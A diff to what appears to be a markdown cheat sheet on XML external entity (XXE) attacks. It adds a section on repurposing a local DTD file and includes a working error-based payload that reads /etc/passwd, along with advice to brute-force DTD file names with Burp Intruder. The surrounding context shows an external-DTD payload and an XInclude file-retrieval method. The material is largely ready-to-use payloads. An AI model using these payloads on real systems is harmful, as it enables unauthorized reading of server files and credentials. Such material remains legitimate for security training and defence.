@@ -34,6 +34,27 @@ Now paste the external DTD server link in burpsuite
 ```xml
 <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://external.dtd.server"> %xxe; ]>
 ```
+### Exploiting XXE to retrieve data by repurposing a local DTD
+Locate an existing DTD file to repurpose. For example, Linux systems using the GNOME desktop environment often have a DTD file at /usr/share/yelp/dtd/docbookx.dtd. You can test whether this file is present by submitting the following XXE payload, which will cause an error if the file is missing. Try bruteforcing with common dtd file names via burp intruder to identify local dtd file. 
+```xml
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+```
+Now use this payload with identified dtd.
+```
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
 ### Exploiting XInclude to retrieve files
 Some applications receive client-submitted data via parameter value(id=1) without xml body, embed it on the server-side into an XML document, and then parse the document. In this situation try this method. Use &xxe; (encode & to %26) to parameter value(id=&xxe;) to identify xxe via error message. Then place this payload in value to retrieve file.
 ```xml
